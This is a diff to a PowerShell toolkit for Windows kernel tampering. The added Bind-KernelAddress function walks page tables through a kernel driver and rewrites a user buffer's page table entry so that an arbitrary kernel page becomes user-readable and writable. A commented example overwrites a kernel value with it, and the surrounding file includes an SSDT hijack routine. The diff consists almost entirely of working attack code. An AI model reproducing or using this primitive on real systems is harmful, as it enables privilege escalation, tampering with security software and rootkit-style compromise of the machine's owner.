@@ -369,6 +369,21 @@ if ($PhysicalAddress -notin @(0,1)) {
 }
 #>
 
+# Remap arbitrary kernel memory into user space via page table manipulation.
+<#
+Clear-Host
+Write-Host
+
+[Int64]$TargetVA = (Get-NtBuildNumber).VA
+$BindObj = Bind-KernelAddress -VA $TargetVA
+if ($BindObj -ne $null) {
+    [marshal]::ReadInt16($BindObj.BaseVA,  $BindObj.ByteOffset)
+    [marshal]::WriteInt16($BindObj.BaseVA, $BindObj.ByteOffset, 19044)
+    Bind-KernelAddress -Package $BindObj -Release
+}
+Read-VirtualAddress -VA $TargetVA -AsShort
+#>
+
 # Process < Misc>
 # Get-KernelThreadList /-ProcessID/ 
 # Read-ProcessMemory /-ProcessID / /-Offset/ -BytesToRead 1024 /-OutHex/
@@ -7137,6 +7152,210 @@ Function Invoke-SsdtNtCallHijack {
     }
     Set-RecoveryState -Status "Succeed"
     return $res
+}
+# Remap arbitrary kernel memory into user space ,
+# via page table manipulation.
+function Bind-KernelAddress {
+    [CmdletBinding()]
+    param (
+        [Parameter(Mandatory = $false, Position = 0)]
+        [IntPtr]$VA = [IntPtr]::Zero,
+
+        [Parameter(Mandatory = $false)]
+        [Object]$Package = $null,
+
+        [Parameter(Mandatory = $false)]
+        [switch]$Release,
+
+        [ValidateSet("mtxvxd", "ktapi")]
+        [String]$DriverName = 'ktapi'
+    )
+
+    # Inline script block variable version of Resolve-PtrAddress
+    $ReturnPTE = {
+        [CmdletBinding(DefaultParameterSetName = 'UInt64')]
+        param (
+            [Parameter(Mandatory = $true, ParameterSetName = 'UInt64', Position = 0)]
+            [UInt64]$VA = 0,
+
+            [Parameter(Mandatory = $true, ParameterSetName = 'Int32', Position = 0)]
+            [Int32]$VA32 = 0,
+
+            [Parameter(Mandatory = $true, ParameterSetName = 'Int64', Position = 0)]
+            [Int64]$VA64 = 0,
+
+            [Parameter(Mandatory = $true, ParameterSetName = 'IntPtr', Position = 0)]
+            [IntPtr]$VAPtr = 0,
+
+            [Parameter(Mandatory = $false, Position = 1)]
+            [ValidateRange(0, [Int32]::MaxValue)]
+            [Int32]$ProcessID = 4
+        )
+
+        switch ($PSCmdlet.ParameterSetName) {
+            'Int32'  { $VA = [UInt64]([UInt32]$VA32) }
+            'Int64'  { $VA = [BitConverter]::ToUInt64([BitConverter]::GetBytes([Int64]$VA64), 0) }
+            'IntPtr' { $VA = [BitConverter]::ToUInt64([BitConverter]::GetBytes([Int64]$VAPtr), 0) }
+        }
+
+        try {
+            $eBase  = Query-EprocessStruct -ProcessID $ProcessID | 
+                ForEach-Object { ConvertFrom-EprocessStruct -EprocessBase $_ }
+            $cr3Raw = $eBase.KernelPhysicalAddress
+
+            [UInt64]$Cr3 = if ($cr3Raw -like "0x*") { [Convert]::ToUInt64($cr3Raw, 16) } else { [UInt64]$cr3Raw }
+        } catch {
+            Write-Error "Failed to retrieve or parse CR3 (Directory Table Base) for Process ID $ProcessID"
+            return 0
+        }
+
+        $pml4_idx = [UInt64](($VA -shr 39) -band 0x1FF)
+        $pdpt_idx = [UInt64](($VA -shr 30) -band 0x1FF)
+        $pd_idx   = [UInt64](($VA -shr 21) -band 0x1FF)
+        $pt_idx   = [UInt64](($VA -shr 12) -band 0x1FF)
+        $offset   = [UInt64]($VA -band 0xFFF)
+
+        [UInt64]$PFN_MASK = 0x0000FFFFFFFFF000
+
+        $pml4e_addr = $Cr3 + ($pml4_idx * 8)
+        $pml4e = Get-UnsignedPhysical -Address $pml4e_addr
+        if (-not ($pml4e -band 1)) { Write-Host "Failed at PML4: Present bit is 0!" -ForegroundColor Red; return 0 }
+
+        $pdpte_addr = ($pml4e -band $PFN_MASK) + ($pdpt_idx * 8)
+        $pdpte = Get-UnsignedPhysical -Address $pdpte_addr
+        if (-not ($pdpte -band 1)) { Write-Host "Failed at PDPT: Present bit is 0!" -ForegroundColor Red; return 0 }
+        if ($pdpte -band 0x80) { return (($pdpte -band 0x0000FFFC0000000) + ($VA -band 0x3FFFFFFF)) }
+
+        $pde_addr = ($pdpte -band $PFN_MASK) + ($pd_idx * 8)
+        $pde = Get-UnsignedPhysical -Address $pde_addr
+        if (-not ($pde -band 1)) { Write-Host "Failed at PD: Present bit is 0!" -ForegroundColor Red; return 0 }
+        if ($pde -band 0x80) { return (($pde -band 0x0000FFFFFE00000) + ($VA -band 0x1FFFFF)) }
+
+        $pte_addr = ($pde -band $PFN_MASK) + ($pt_idx * 8)
+        $pte = Get-UnsignedPhysical -Address $pte_addr
+        if (-not ($pte -band 1)) { Write-Host "Failed at PT: Present bit is 0!" -ForegroundColor Red; return 0 }
+
+        return $pte_addr
+    }
+
+    # If package is provided and not null, release/unmap the object
+    if ($null -ne $Package) {
+        try {
+            if ($Package.MappedSuccessfully -and $Package.PteAddress -ne 0L -and $Package.OriginalPteValue -ne 0L) {
+                $cleanupMap = Map-VirtualAddress -PA $Package.PteAddress -BlockSize 16 -DriverName $Package.DriverName
+                if ($null -ne $cleanupMap) {
+                    $CleanMappedAddress = if ($cleanupMap -is [IntPtr]) { $cleanupMap } else { [IntPtr]$cleanupMap.MappedAddress }
+                    [marshal]::WriteInt64($CleanMappedAddress, 0, $Package.OriginalPteValue)
+                    Unmap-VirtualAddress -MappedAddress $cleanupMap -DriverName $Package.DriverName | Out-Null
+                }
+            }
+        } catch {
+            Write-Warning "Failed to cleanly restore original PTE value during unmap: $_"
+        }
+
+        if ($Package.BaseVA -ne [IntPtr]::Zero) {
+            try {
+                $regionSizeRef = $Package.RegionSize
+                $baseVaRef = $Package.BaseVA
+                $freeValues = -1, [ref]$baseVaRef, [ref]$regionSizeRef, 0x8000 # MEM_RELEASE
+                Invoke-UnmanagedMethod -Dll ntdll.dll -Function NtFreeVirtualMemory -Values $freeValues | Out-Null
+            } catch { }
+        }
+
+        return
+    }
+
+    # Otherwise, create mapped object
+    if ($VA -eq [IntPtr]::Zero) {
+        throw "A valid target virtual address must be specified."
+    }
+
+    [Int64]$TargetAddress = [Int64]$VA
+    [IntPtr]$BaseVA = [IntPtr]::Zero
+    [IntPtr]$RegionSize = [IntPtr]4096
+    [uint32]$MEM_RESERVE = 0x2000
+    [uint32]$MEM_COMMIT = 0x1000
+    [uint32]$PAGE_READWRITE = 0x04
+
+    $allocValues = -1, [ref]$BaseVA, [IntPtr]::Zero, [ref]$RegionSize, ($MEM_RESERVE -bor $MEM_COMMIT), $PAGE_READWRITE
+    Invoke-UnmanagedMethod -Dll ntdll.dll -Function NtAllocateVirtualMemory -Values $allocValues | Out-Null
+
+    if ($BaseVA -eq [IntPtr]::Zero) {
+        throw "Failed to allocate temporary user virtual memory buffer."
+    }
+
+    [Marshal]::WriteInt64($BaseVA, 0, 0)
+
+    [Int64]$PTE_Address = 0L
+    [Int64]$PTE_Value = 0L
+    [bool]$MappedSuccessfully = $false
+    $vaMap = $null
+
+    try {
+        [Int64]$TargetPA = Resolve-DirectoryTable -VA64 $TargetAddress -ProcessID 4
+        if ($TargetPA -eq 0L) { throw "Failed to resolve physical address for target VA: 0x{0:X}" -f $TargetAddress }
+
+        [Int64]$TargetPhysicalPageBase = $TargetPA -band 0xFFFFFFFFFFFFF000
+        [Int64]$TargetPFN = $TargetPhysicalPageBase -shr 12
+        [UInt64]$ByteOffset = $TargetAddress -band 0xFFF
+
+        [Int64]$BaseVAInt64 = [Int64]$BaseVA
+        [UInt64]$PTE_AddressRaw = & $ReturnPTE -VA64 $BaseVAInt64 -ProcessID $PID
+        $PTE_Address = [Int64]$PTE_AddressRaw
+        if ($PTE_Address -eq 0L) { throw "Failed to resolve user buffer PTE address." }
+
+        $vaMap = Map-VirtualAddress -PA $PTE_Address -BlockSize 16 -DriverName $DriverName
+        if ($null -ne $vaMap) {
+            $PteMappedAddress = if ($vaMap -is [IntPtr]) { $vaMap } else { [IntPtr]$vaMap.MappedAddress }
+    
+            # 1. Read original
+            $PTE_Value = [marshal]::ReadInt64($PteMappedAddress, 0)
+
+            # 2. Compute and write new
+            [UInt64]$UserReadWriteFlags = 0x07 
+            [UInt64]$NewPTEValueUInt64 = ([UInt64]$TargetPFN -shl 12) -bor $UserReadWriteFlags -bor 0x8000000000000000
+            [Int64]$NewPTEValue = [BitConverter]::ToInt64([BitConverter]::GetBytes($NewPTEValueUInt64), 0)
+    
+            [marshal]::WriteInt64($PteMappedAddress, 0, $NewPTEValue)
+    
+            # 3. Clean unmap once at the end
+            Unmap-VirtualAddress -MappedAddress $vaMap -DriverName $DriverName | Out-Null
+            $MappedSuccessfully = $true
+        }
+
+        $FinalPointer = [IntPtr]::Add($BaseVA, [int]$ByteOffset)
+
+        return [PSCustomObject]@{
+            BaseVA           = $BaseVA
+            ByteOffset       = $ByteOffset
+            PteAddress       = $PTE_Address
+            OriginalPteValue = $PTE_Value
+            MappedSuccessfully = $MappedSuccessfully
+            DriverName       = $DriverName
+            RegionSize       = $RegionSize
+        }
+
+    } catch {
+        if ($MappedSuccessfully -and $PTE_Address -ne 0L -and $PTE_Value -ne 0L) {
+            try {
+                $cleanupMap = Map-VirtualAddress -PA $PTE_Address -BlockSize 16 -DriverName $DriverName
+                if ($null -ne $cleanupMap) {
+                    $CleanMappedAddress = if ($cleanupMap -is [IntPtr]) { $cleanupMap } else { [IntPtr]$cleanupMap.MappedAddress }
+                    [marshal]::WriteInt64($CleanMappedAddress, 0, $PTE_Value)
+                    Unmap-VirtualAddress -MappedAddress $cleanupMap -DriverName $DriverName | Out-Null
+                }
+            } catch { }
+        }
+
+        if ($BaseVA -ne [IntPtr]::Zero) {
+            try {
+                $freeValues = -1, [ref]$BaseVA, [ref]$RegionSize, 0x8000
+                Invoke-UnmanagedMethod -Dll ntdll.dll -Function NtFreeVirtualMemory -Values $freeValues | Out-Null
+            } catch { }
+        }
+
+        throw $_
+    }
 }
 #endregion
 #region Process
